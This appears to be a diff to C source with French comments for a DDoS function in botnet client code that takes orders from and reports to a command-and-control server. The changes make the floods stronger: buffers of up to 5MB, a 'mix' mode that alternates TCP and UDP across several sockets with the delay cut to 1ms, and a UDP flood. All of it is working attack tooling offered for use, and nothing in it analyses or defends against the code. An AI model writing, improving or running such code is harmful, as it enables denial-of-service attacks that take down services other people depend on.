@@ -198,18 +198,32 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
     time_t start_time = time(NULL);
     int sock;
 
-    // Paquets de 5MB pour les attaques
-    const int PACKET_SIZE = 5 * 1024 * 1024; // 5MB
-    char* large_packet = (char*)malloc(PACKET_SIZE);
-    if (large_packet == NULL) {
-        // Si pas assez de mémoire, utiliser un plus petit paquet
-        PACKET_SIZE = 64 * 1024; // 64KB
-        large_packet = (char*)malloc(PACKET_SIZE);
+    // Configuration des paquets d'attaque
+    #define MAX_PACKET_SIZE (5 * 1024 * 1024)  // 5MB max
+    #define MIN_PACKET_SIZE (1024)             // 1KB min
+    
+    // Essayer d'allouer avec différentes tailles
+    int packet_sizes[] = {MAX_PACKET_SIZE, 512*1024, 64*1024, MIN_PACKET_SIZE};
+    int packet_size = 0;
+    char* attack_packet = NULL;
+    
+    for (int i = 0; i < sizeof(packet_sizes)/sizeof(int); i++) {
+        packet_size = packet_sizes[i];
+        attack_packet = (char*)malloc(packet_size);
+        if (attack_packet != NULL) {
+            break;
+        }
+    }
+    
+    if (attack_packet == NULL) {
+        snprintf(message, sizeof(message), "DDOS_ERROR|%s:%d|NO_MEMORY", target, port);
+        send(c2_socket, message, strlen(message), 0);
+        return;
     }
     
     // Remplir le paquet avec des données aléatoires
-    for (int i = 0; i < PACKET_SIZE; i++) {
-        large_packet[i] = rand() % 256;
+    for (int i = 0; i < packet_size; i++) {
+        attack_packet[i] = rand() % 256;
     }
     
     // Informer le serveur C2 du début de l'attaque
@@ -302,27 +316,49 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
             sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
             if (sock != -1) {
                 connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
-                send(sock, large_packet, 64, 0); // Juste 64 octets
+                send(sock, attack_packet, 64, 0); // Juste 64 octets
                 close(sock);
             }
             usleep(5000); // 5ms délai
         }
     }
     else if (strcmp(method, "mix") == 0) {
-        // Mix d'attaques légères
+        // Mix d'attaques optimisé pour performance maximale
+        int num_threads = 4; // Nombre de threads d'attaque
+        int active_sockets[4] = {0}; // Sockets par thread
+        
         while (time(NULL) - start_time < duration) {
-            sock = socket(AF_INET, rand() % 2 ? SOCK_STREAM : SOCK_DGRAM, 0);
-            if (sock != -1) {
-                if (rand() % 2) { // TCP
-                    connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
-                    send(sock, small_packet, 128, 0);
-                } else { // UDP
-                    sendto(sock, small_packet, 128, 0, 
-                           (struct sockaddr*)&target_addr, sizeof(target_addr));
+            for (int t = 0; t < num_threads; t++) {
+                // Alterner entre TCP et UDP
+                int proto = (t + (int)time(NULL)) % 2;
+                sock = socket(AF_INET, 
+                            proto ? SOCK_STREAM | SOCK_NONBLOCK : SOCK_DGRAM,
+                            proto ? 0 : IPPROTO_UDP);
+                
+                if (sock != -1) {
+                    if (proto) { // TCP
+                        if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
+                            send(sock, attack_packet, packet_size, 0);
+                        }
+                    } else { // UDP
+                        sendto(sock, attack_packet, packet_size, 0,
+                               (struct sockaddr*)&target_addr, sizeof(target_addr));
+                    }
+                    
+                    if (active_sockets[t]) {
+                        close(active_sockets[t]);
+                    }
+                    active_sockets[t] = sock;
                 }
-                close(sock);
             }
-            usleep(15000); // 15ms délai
+            usleep(1000); // 1ms délai
+        }
+        
+        // Nettoyer les sockets
+        for (int t = 0; t < num_threads; t++) {
+            if (active_sockets[t]) {
+                close(active_sockets[t]);
+            }
         }
     }
     else if (strcmp(method, "udp") == 0) {
@@ -330,7 +366,7 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
         sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
         if (sock != -1) {
             while (time(NULL) - start_time < duration) {
-                sendto(sock, large_packet, PACKET_SIZE, 0,
+                sendto(sock, attack_packet, packet_size, 0,
                        (struct sockaddr*)&target_addr, sizeof(target_addr));
                 usleep(1000); // 1ms délai
             }
